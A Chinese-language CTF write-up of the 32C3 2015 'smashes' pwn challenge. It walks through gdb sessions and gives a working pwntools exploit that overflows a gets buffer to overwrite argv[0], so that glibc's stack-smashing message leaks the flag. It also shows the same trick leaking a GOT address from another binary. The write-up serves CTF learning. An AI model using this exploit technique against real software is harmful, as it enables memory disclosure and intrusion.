---
title: 2015 32C3 CTF smashes
date: 2016-10-28 02:03:22
tags:
- stack
- canary
- fortify
- ctf
categories:
- ctf_practice
---

不久前做了一个比较有趣的题，觉得这个题脑洞确实比较大，也在这个题中学到了一些东西，所以记录一下

## Challenge
先看一下[程序](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200)：
<!-- more -->
```c
__int64 func()
{
  __int64 v0; // rax@1
  __int64 v1; // rbx@2
  int v2; // eax@3
  __int64 name; // [sp+0h] [bp-128h]@1
  __int64 canary; // [sp+108h] [bp-20h]@1

  canary = *MK_FP(__FS__, 40LL);
  __printf_chk(1LL, "Hello!\nWhat's your name? ");
  LODWORD(v0) = _IO_gets(&name);
  if ( !v0 )
LABEL_9:
    _exit(1);
  v1 = 0LL;
  __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v2 = _IO_getc(stdin);
    if ( v2 == -1 )
      goto LABEL_9;
    if ( v2 == 10 )
      break;
    byte_600D20[v1++] = v2;
    if ( v1 == 32 )
      goto LABEL_8;
  }
  memset((void *)((signed int)v1 + 6294816LL), 0, (unsigned int)(32 - v1));
LABEL_8:
  puts("Thank you, bye!");
  return *MK_FP(__FS__, 40LL) ^ canary;
}
```
_IO_gets那明显有栈溢出。

再来看一下开了哪些保护：
```shell
root@kali:~/Desktop# checksec smashes 
[*] '/root/Desktop/smashes'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
    FORTIFY:  Enabled
```
程序开了canary和fortify，因此无法用常规方法。一时不会做，只能去求助他人了，问了好几个师傅都不会，后来在某位师傅的帮助下找到了原题。

## Solution
这题得利用fortify的报错泄露信息，有趣吧~~~其实就是当栈溢出时，程序终止退出的时候会调用 \__stack_chk_fail函数打印argv[0]这个指针指向的字符串，默认是程序的名字。所以如果我们把它覆盖为flag的地址时，它就会把flag给打印出来。
```c
 void
 __attribute__ ((noreturn))
 __stack_chk_fail (void)
   {
      __fortify_fail ("stack smashing detected");
   }

 void
 __attribute__ ((noreturn)) internal_function
 __fortify_fail (const char *msg)
   {
     /* The loop is added only to keep gcc happy.  */
     while (1)
       __libc_message (2, "*** %s ***: %s terminated\n",
               msg, __libc_argv[0] ?: "<unknown>");
   }
```
```shell
root@kali:~/Desktop# python -c 'print "a"*0x200 + "\n" + "a"' | ./smashes 
Hello!
What's your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: ./smashes terminated
```
然后我们要确认argv[0]距离缓冲区的距离。
```shell
gdb-peda$ b *0x000000000040080E
[-------------------------------------code-------------------------------------]
   0x400804:	xor    eax,eax
   0x400806:	call   0x4006b0 <__printf_chk@plt>
   0x40080b:	mov    rdi,rsp
=> 0x40080e:	call   0x4006c0 <_IO_gets@plt>
   0x400813:	test   rax,rax
   0x400816:	je     0x40089f
   0x40081c:	mov    rdx,rsp
   0x40081f:	mov    esi,0x400960
Guessed arguments:
arg[0]: 0x7fffffffe1a0 --> 0x1 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe1a0 --> 0x1 
0008| 0x7fffffffe1a8 --> 0x7ffff7ff7a10 --> 0x400458 ("GLIBC_2.2.5")
0016| 0x7fffffffe1b0 --> 0x1 
0024| 0x7fffffffe1b8 --> 0x0 
0032| 0x7fffffffe1c0 --> 0x1 
0040| 0x7fffffffe1c8 --> 0x600cc0 --> 0x7ffff7aa7920 (<setbuf>:	mov    edx,0x2000)
0048| 0x7fffffffe1d0 --> 0x4006ee (xor    ebp,ebp)
0056| 0x7fffffffe1d8 --> 0x7fffffffe3b0 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x000000000040080e in ?? ()
gdb-peda$ find /root
Searching for '/root' in: None ranges
Found 4 results, display max 4 items:
[stack] : 0x7fffffffe667 ("/root/Desktop/smashes")
[stack] : 0x7fffffffee22 ("/root/Desktop")
[stack] : 0x7fffffffee8c --> 0x445800746f6f722f ('/root')
[stack] : 0x7fffffffefe2 ("/root/Desktop/smashes")

gdb-peda$ find 0x7fffffffe667
Searching for '0x7fffffffe667' in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd64b8 --> 0x7fffffffe667 ("/root/Desktop/smashes")
[stack] : 0x7fffffffe3b8 --> 0x7fffffffe667 ("/root/Desktop/smashes")

gdb-peda$ distance $rsp 0x7fffffffe3b8
From 0x7fffffffe1a0 to 0x7fffffffe3b8: 536 bytes, 134 dwords
```
由上面可以知道argv[0]距离缓冲区的距离为0x218个字节。
我们在本地覆盖一下argv[0]:
```shell
root@kali:~/Desktop# python -c 'print "a"*0x218+"\x20\x0d\x40\x00\x00\x00\x00\x00"+"\n"+"a"' | ./smashes 
Hello!
What's your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@.aaaaaaaaaaaaaaa 
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: PCTF{Here's the flag on server} terminated
```
注意不要用原来flag的地址覆盖，因为原来存储flag的地方会被overwrite。但是由于ELF的映射方式，此flag会被映射两次，另外一个地方flag的内容不会变。
```shell
gdb-peda$ find PCTF
Searching for 'PCTF' in: None ranges
Found 2 results, display max 2 items:
smashes : 0x400d20 ("PCTF{Here's the flag on server}")  <== target address
smashes : 0x600d20 ("PCTF{Here's the flag on server}")
```
OK，成功了。但时在连接远程时不会成功，原因是[__libc_message](http://osxr.org:8080/glibc/source/sysdeps/posix/libc_fatal.c)函数的问题。
```c
void
__libc_message (int do_abort, const char *fmt, ...)
{
  va_list ap; 
  int fd = -1; 

  va_start (ap, fmt);

  /* Open a descriptor for /dev/tty unless the user explicitly
     requests errors on standard error.  */
  const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_");
  if (on_2 == NULL || *on_2 == '\0')
    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);

  if (fd == -1) 
    fd = STDERR_FILENO;

  /*......*/
}
```
如果LIBC_FATAL\_STDERR_环境变量没有设置或者为空，stderr会redirect到_PATH_TTY，通常是/dev/tty，因此错误信息将不会输出到stderr而是服务端可见的设备。
所以我们必须设置这个环境变量，正好可以用这个环境变量去覆盖flag的内容(但是我在虚拟机里打另一台虚拟机却始终没实验成功，远程打也有不成功的时候)。不知道为什么.
最终的exp如下：
```python
from pwn import *
old_flag_addr = 0x600d20
new_flag_addr = 0x400d20

debug = 0
if debug:
    p = process('./smashes')
else:
    p = remote('pwn.jarvisoj.com', 9877)

p.recvuntil("name?")
payload = "a"*0x218 + p64(new_flag_addr) 
payload += p64(0) + p64(old_flag_addr)
p.sendline(payload)

p.recvuntil("flag: ")
env = "LIBC_FATAL_STDERR_=1"
p.sendline(env)

flag = p.recv()
print flag
```
最终得到的结果如下：
```shell
root@kali:~/Desktop# python smashes.py 
[+] Opening connection to pwn.jarvisoj.com on port 9877: Done
Thank you, bye!
*** stack smashing detected ***: PCTF{57dErr_Smasher_good_work!} terminated

[*] Closed connection to pwn.jarvisoj.com port 9877
```

## Conclusion
根据glibc的源码可知，只要程序开了canary栈保护，就可以覆盖argv[0]来泄露想要的信息(&set LIBC_FATAL\_STDERR_=1)。我又另外试验了一次，确实可以：
```shell
root@kali:~/Desktop# checksec test
[*] '/root/Desktop/test'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE

root@kali:~/Desktop# python -c 'print "a"*280+"\x60\x09\x60\x00\x00\x00\x00\x00"' | ./test 
*** stack smashing detected ***: �Z��� terminated
Segmentation fault
```
上面我泄露的是read@got的地址，要注意的是如果有\x00截断的话就不行了。(we can leank 2 address and search in libcdatabase)

## Links
[write-ups-2015/32c3-ctf-2015/pwn/readme-200](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200)





